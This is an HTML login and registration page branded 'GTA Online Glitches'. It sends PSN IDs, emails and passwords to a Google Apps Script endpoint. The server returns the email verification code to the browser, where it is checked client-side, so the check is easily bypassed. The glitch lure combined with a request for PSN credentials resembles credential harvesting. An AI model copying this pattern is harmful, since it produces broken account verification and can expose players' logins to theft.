<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Platform Access</title>
    <style>
        /* Modern Gaming Header Style */
        .header-banner {
            width: 100%;
            padding: 50px 0;
            text-align: center;
            background: rgba(15, 23, 42, 0.9); /* Dark background */
            margin-bottom: 40px;
            font-size: 3.5em; /* Larger size */
            font-weight: 900;
            text-transform: uppercase;
            color: #facc15; /* Vibrant Yellow */
            font-family: 'Impact', 'Arial Black', sans-serif; /* Bold gaming font */
            text-shadow: 2px 2px 0px #000, 0 0 10px rgba(250, 204, 21, 0.4);
            letter-spacing: 2px;
            /* Border removed */
        }

        body { 
            background: #0f172a; 
            color: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
        }
        .card { 
            background: rgba(255, 255, 255, 0.05); 
            backdrop-filter: blur(15px); 
            padding: 40px; 
            border-radius: 20px; 
            border: 1px solid rgba(255,255,255,0.1); 
            width: 320px; 
            text-align: center; 
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
        }
        input { 
            width: 100%; 
            padding: 12px; 
            margin: 10px 0; 
            background: #1e293b; 
            border: 1px solid #334155; 
            border-radius: 8px; 
            color: white; 
            box-sizing: border-box; 
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #3b82f6;
        }
        button { 
            width: 100%; 
            padding: 12px; 
            background: #3b82f6; 
            border: none; 
            border-radius: 8px; 
            color: white; 
            cursor: pointer; 
            font-weight: bold; 
            margin-top: 15px;
            transition: background 0.3s;
        }
        button:hover {
            background: #2563eb;
        }
        .hidden { 
            display: none; 
        }
        .toggle-text { 
            cursor: pointer; 
            font-size: 0.85em; 
            margin-top: 20px; 
            color: #94a3b8; 
            transition: color 0.3s;
        }
        .toggle-text:hover {
            color: white;
        }
        #msg { 
            font-size: 0.9em; 
            margin-top: 15px; 
            color: #ef4444; 
            font-weight: bold;
        }
        #msg.success { 
            color: #22c55e; 
        }
    </style>
</head>
<body>

<div class="header-banner">GTA Online Glitches</div>

<div class="card" id="app">
    <h2 id="title">Login</h2>
    <div id="fields">
        <input type="text" id="psn" placeholder="PSN ID">
        <div id="emailBox" class="hidden"><input type="email" id="email" placeholder="Email"></div>
        <input type="password" id="pass" placeholder="Password">
        
        <div id="codeBox" class="hidden"><input type="text" id="vCode" placeholder="Enter 6-digit Code"></div>
    </div>
    <button id="btn" onclick="handleAction()">Sign In</button>
    
    <p id="msg"></p> 
    
    <p onclick="switchMode()" class="toggle-text" id="toggleText">Don't have account? Register</p>
</div>

<script>
    let mode = 'login'; 
    let savedCode = '';
    const url = 'https://script.google.com/macros/s/AKfycbzYU9K4cQjKiS8j46t8tXZE7JUiDHvet5gfD6gT3gMRjTroY5VL6TGIBb51wBwALpzIZg/exec';

    function switchMode() {
        mode = mode === 'login' ? 'register' : 'login';
        
        document.getElementById('title').innerText = mode === 'login' ? 'Login' : 'Register';
        document.getElementById('btn').innerText = mode === 'login' ? 'Sign In' : 'Send Verification Code';
        document.getElementById('toggleText').innerText = mode === 'login' ? 'Don\'t have account? Register' : 'Already have account? Login';
        
        document.getElementById('emailBox').classList.toggle('hidden', mode === 'login');
        document.getElementById('codeBox').classList.add('hidden'); 
        
        document.getElementById('msg').innerText = "";
        document.getElementById('msg').className = "";
        
        document.getElementById('vCode').value = "";
    }

    async function handleAction() {
        let msgEl = document.getElementById('msg');
        let btn = document.getElementById('btn');
        
        msgEl.innerText = "Processing...";
        msgEl.className = "";

        let payload = { action: mode, psn: document.getElementById('psn').value, password: document.getElementById('pass').value };
        
        if (mode === 'register') {
            payload.email = document.getElementById('email').value;
            
            if (btn.innerText === 'Send Verification Code') {
                if(!payload.psn || !payload.email || !payload.password) {
                    msgEl.innerText = "Please fill all fields.";
                    return;
                }
                
                payload.action = 'sendCode';
                let resp = await fetch(url, { method: 'POST', body: JSON.stringify(payload) });
                let res = await resp.json();
                
                if(res.status === 'codeSent') {
                    savedCode = res.code;
                    document.getElementById('codeBox').classList.remove('hidden'); 
                    btn.innerText = 'Verify & Complete';
                    msgEl.innerText = "Verification code sent to your email!";
                    msgEl.className = "success";
                } else { 
                    msgEl.innerText = res.message; 
                }
            } 
            else {
                if(document.getElementById('vCode').value === savedCode) {
                    payload.action = 'save';
                    let resp = await fetch(url, { method: 'POST', body: JSON.stringify(payload) });
                    let res = await resp.json();
                    
                    msgEl.innerText = res.message;
                    if(res.status === 'success') {
                        msgEl.className = "success";
                        btn.classList.add('hidden'); 
                    }
                } else { 
                    msgEl.innerText = "Invalid verification code!"; 
                }
            }
        } 
        else {
            if(!payload.psn || !payload.password) {
                msgEl.innerText = "Please enter PSN ID and Password.";
                return;
            }
            
            let resp = await fetch(url, { method: 'POST', body: JSON.stringify(payload) });
            let res = await resp.json();
            
            msgEl.innerText = res.message;
            if(res.status === 'success') {
                msgEl.className = "success";
            }
        }
    }
</script>
</body>
</html>
